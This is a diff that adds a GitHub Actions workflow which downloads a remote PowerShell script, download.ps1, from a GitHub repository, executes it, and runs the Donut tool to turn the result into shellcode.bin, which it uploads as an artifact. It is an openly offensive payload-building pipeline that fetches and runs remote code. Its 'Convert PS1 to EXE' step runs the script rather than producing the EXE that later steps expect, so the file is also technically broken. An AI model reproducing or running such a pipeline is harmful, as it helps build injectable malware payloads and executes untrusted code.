@@ -1,0 +1,60 @@
+name: Convert and Upload Shellcode
+
+on:
+  push:
+    paths:
+      - download.ps1
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v2
+
+    - name: Download the latest download.ps1
+      run: Invoke-WebRequest -Uri https://raw.githubusercontent.com/43a1723/test/main/download.ps1 -OutFile download.ps1
+      shell: powershell
+
+    - name: Convert PS1 to EXE
+      run: |
+        $source = "download.ps1"
+        $target = "download.exe"
+        $code = Get-Content $source | Out-String
+        Add-Type -TypeDefinition @"
+        using System;
+        using System.Management.Automation;
+        public class Program {
+            public static void Main(string[] args) {
+                var script = @"
+        $code
+        "@;
+                using (var ps = PowerShell.Create()) {
+                    ps.AddScript(script).Invoke();
+                }
+            }
+        }
+        "@
+        [Program]::Main($null)
+      shell: powershell
+
+    - name: Download Donut
+      run: |
+        Invoke-WebRequest -Uri https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut_v1.0.zip
+        Expand-Archive -Path donut_v1.0.zip -DestinationPath shellcode
+      shell: powershell
+
+    - name: Convert EXE to Shellcode
+      run: .\shellcode\donut.exe -i download.exe -o shellcode.bin
+      shell: powershell
+
+    - name: Move shellcode.bin to Extras
+      run: New-Item -ItemType Directory -Force -Path Extras; Move-Item shellcode.bin Extras/
+      shell: powershell
+
+    - name: Upload shellcode.bin to GitHub
+      uses: actions/upload-artifact@v2
+      with:
+        name: shellcode
+        path: Extras/shellcode.bin
